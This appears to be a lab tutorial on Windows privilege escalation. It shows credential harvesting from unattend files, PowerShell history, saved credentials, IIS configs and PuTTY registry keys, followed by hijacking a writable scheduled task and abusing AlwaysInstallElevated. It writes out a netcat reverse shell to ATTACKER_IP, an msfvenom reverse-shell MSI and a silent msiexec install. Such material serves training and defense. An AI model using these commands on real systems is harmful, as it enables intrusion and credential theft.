# Introduction

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

# Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

|       Groups       |                                                                                     Description                                                                                     |
| :----------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| **Administrators** |                             These users have the most privileges. They can change any system configuration parameter and access any file in the system.                             |
| **Standard Users** | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. |
Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

Below are some special built-in accounts used by the operating system in the context of privilege escalation:

|         Accounts         |                                                                                       Description                                                                                       |
| :----------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
|    **Local Service**     |                               Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.                               |
|   **Network Service**    |                    Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.                    |

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

# Harvesting Passwords from Usual Spots

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plain text files; or even stored by some software like browsers or email clients.

Below are places to look for passwords on a Windows system.

## Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

```
C:\Users\thm-unpriv> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

## Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```
C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\admin
    Type: Domain Password
    User: WPRIVESC1\admin

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
```

## IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
```

## Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

## Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

 "Task to Run" parameter indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

```
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

```
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:

```
C:\> schtasks /run /tn vulntask
```

And you will receive the reverse shell with taskusr1 privileges as expected:

```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
